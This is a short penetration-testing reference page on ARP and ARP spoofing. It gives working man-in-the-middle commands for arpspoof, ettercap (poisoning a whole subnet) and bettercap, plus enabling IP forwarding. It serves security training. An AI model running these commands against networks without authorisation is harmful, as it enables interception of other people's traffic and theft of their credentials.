# ARP Spoofing

## ARP

• An ARP request message should be placed in a frame and broadcast to all computers on the network&#x20;

• Each computer receives the request and examines the IP address&#x20;

• The computer mentioned in the request sends a response; all other computers process and discard the request without sending a response

![](<../../.gitbook/assets/image (293) (1) (1) (1).png>)

## Gratuitous ARP

• Gratuitous ARP is used by hosts to “announce” their IP address to the local network and avoid duplicate IP addresses on the network; routers and other network hardware may use cache information gained from gratuitous ARPs&#x20;

• Gratuitous ARP is a broadcast packet (like an ARP request)

![](<../../.gitbook/assets/image (277) (1).png>)

HOST W: Hey everyone I’m host W and my IP Address is 1.2.3.4 and my MAC address is 12:34:56:78:9A:BC

## ARP Spoofing

### arpspoof

```
arpspoof -t [target] -r [router]
```

example:

#### 1. Enable ip forwarding first

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

#### 2. tell 172.16.5.1 that if they need to communicate with 172.16.5.23 they must pass from the attacker system

```
arpspoof -i tap0 -t 172.16.5.1 -r 172.16.5.23 
```

#### now, in a separate terminal

#### 3. tell 172.16.5.23 that if the need to communicate with 172.16.5.1 they must pass from the pentester system

```
arpspoof -i tap0 -t 172.16.5.23 -r 172.16.5.1
```

### Ettercap

```
ettercap [options] [target1] [target2]
```

example:

```
ettercap -T -q -M arp::remote /172.16.0.1-254//   /172.16.0.1-254//
```

### Bettercap

#### Refer to [Bettercap cheat sheet](arp-spoofing.md#bettercap) for full documentation.

specify a number of IP addresses, comma=separated

```
set arp.spoof.targets IPs
```

turn ARP spoof on/off

```
arp.spoof on / off
```

#### When the arp.spoof module is started, Bettercap will automatically configure the OS features for the MitM attack (such as turning on IP forwarding on Linux systems)
